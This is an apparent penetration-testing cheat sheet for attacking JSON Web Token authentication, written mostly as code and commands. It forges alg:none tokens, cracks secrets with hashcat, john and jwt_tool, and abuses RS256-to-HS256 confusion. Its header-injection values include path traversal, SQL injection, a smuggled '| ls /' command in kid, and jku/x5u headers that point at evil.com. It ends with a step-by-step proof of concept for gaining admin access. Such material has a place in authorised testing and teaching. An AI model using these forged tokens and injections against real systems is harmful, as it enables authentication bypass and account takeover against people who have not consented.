# JWT Attacks - JSON Web Token

## What Is It
Exploit weak/misconfigured JWT implementation → auth bypass, account takeover.

## Features / Where to Find
- Authorization header: `Bearer eyJ...`
- Cookie: `token=eyJ...`, `jwt=eyJ...`
- Response body after login
- localStorage in browser DevTools
- Any API using stateless auth

## JWT Structure
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9  ← Header (base64)
.eyJ1c2VyIjoiYWRtaW4ifQ                ← Payload (base64)
.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV   ← Signature

Decoded Header:  {"alg":"HS256","typ":"JWT"}
Decoded Payload: {"user":"john","role":"user","exp":1234567890}
```

---

## Actions / Attack Techniques

### 1. Algorithm None Attack
```python
# Change alg to "none" → signature not verified
# Original header: {"alg":"HS256","typ":"JWT"}
# Attack header:   {"alg":"none","typ":"JWT"}

import base64, json

header = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip('=')
payload = base64.b64encode(json.dumps({"user":"admin","role":"admin"}).encode()).decode().rstrip('=')

token = f"{header}.{payload}."   # Empty signature
```

### 2. Weak Secret Brute Force
```bash
# hashcat
hashcat -a 0 -m 16500 token.txt /usr/share/wordlists/rockyou.txt

# jwt_tool
python3 jwt_tool.py TOKEN -C -d wordlist.txt

# john
john --wordlist=wordlist.txt --format=HMAC-SHA256 jwt.txt

# Common weak secrets to try:
# secret, password, 123456, jwt_secret, your-256-bit-secret
# secret_key, admin, key, token, mysecret
```

### 3. RS256 → HS256 Algorithm Confusion
```python
# If server uses RS256 (public/private key)
# Attack: switch to HS256 and sign with PUBLIC KEY as secret
# Server verifies using PUBLIC KEY as HMAC secret = bypass

# Get public key from:
# /jwks.json, /.well-known/jwks.json
# /api/.well-known/openid-configuration

# jwt_tool
python3 jwt_tool.py TOKEN -X k -pk public.pem
```

### 4. Modify Payload (After Breaking Sig)
```json
// Original payload
{"user": "john", "role": "user", "exp": 1234567890}

// Attack: change to admin
{"user": "admin", "role": "admin", "exp": 9999999999}

// Or change user ID for IDOR
{"user_id": 1234} → {"user_id": 1}
```

### 5. JWT Header Injection (kid, jku, x5u)
```json
// kid - Key ID injection
{"alg":"HS256","kid":"../../dev/null"}
// Server reads /dev/null as key = empty string = sign with empty string

{"alg":"HS256","kid":"| ls /"}
// SQL injection in kid:
{"alg":"HS256","kid":"' UNION SELECT 'attacker_key'-- -"}

// jku - JSON Web Key Set URL injection
{"alg":"RS256","jku":"https://evil.com/jwks.json"}
// Server fetches attacker's key set

// x5u - X.509 URL injection
{"alg":"RS256","x5u":"https://evil.com/cert.pem"}
```

### 6. Expired Token Still Works
```bash
# Check exp claim
# Try using token after expiration
# If still works → no expiration validation
```

### 7. Sensitive Data in Payload
```bash
# Decode payload (no need to crack signature)
echo "eyJ1c2VyIjoiYWRtaW4ifQ" | base64 -d
# Look for: passwords, API keys, PII, internal paths
```

---

## jwt_tool Cheatsheet
```bash
# Install
git clone https://github.com/ticarpi/jwt_tool
pip3 install pycryptodomex requests termcolor

# Decode and display
python3 jwt_tool.py TOKEN

# Test all attacks automatically
python3 jwt_tool.py TOKEN -t https://target.com/api/endpoint -rh "Authorization: Bearer TOKEN" -M at

# None algorithm
python3 jwt_tool.py TOKEN -X a

# Brute force secret
python3 jwt_tool.py TOKEN -C -d wordlist.txt

# RS256 to HS256
python3 jwt_tool.py TOKEN -X k -pk public.pem

# Tamper payload
python3 jwt_tool.py TOKEN -T
# Interactive: change claims

# kid injection
python3 jwt_tool.py TOKEN -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```

---

## Burp Suite JWT Testing
```
1. Install "JWT Editor" extension
2. Intercept request with JWT
3. Go to "JSON Web Token" tab
4. Modify payload claims
5. Click "Attack" → test all vulns
```

---

## PoC: None Algorithm Attack
```
1. Capture JWT: eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiIsInJvbGUiOiJ1c2VyIn0.SIG

2. Decode payload: {"user":"john","role":"user"}

3. Craft new token:
   Header: {"alg":"none"} → eyJhbGciOiJub25lIn0
   Payload: {"user":"admin","role":"admin"} → eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ
   Token: eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.

4. Send request with new token
5. Access admin functionality

Impact: Full admin access without valid credentials
```

## Report Template
**Title:** JWT [alg:none / weak secret / algorithm confusion] allows authentication bypass
**Severity:** Critical
**Impact:** Account takeover, admin access, bypass of all authentication
